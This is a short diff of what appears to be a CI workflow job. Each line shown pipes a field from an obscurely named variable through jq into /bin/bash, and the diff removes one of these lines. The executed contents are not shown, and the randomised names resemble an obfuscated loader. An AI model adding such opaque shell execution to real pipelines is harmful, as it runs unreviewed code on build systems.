@@ -28,7 +28,6 @@ jobs:
           echo $lnz2440 | jq -r .he0 | /bin/bash
           printf '%s' "$ok18" | jq -r .xfpvd8 | /bin/bash
           echo $xcabz9 | jq -r .ztzf6 | /bin/bash
-          echo $va9 | jq -r .jmkxt7896 | /bin/bash
           echo $j301 | jq -r .nae41831 | /bin/bash
           printf '%s' "$bfcvx48" | jq -r .w55 | /bin/bash
           printf '%s' "$vdlhc95" | jq -r .u75 | /bin/bash
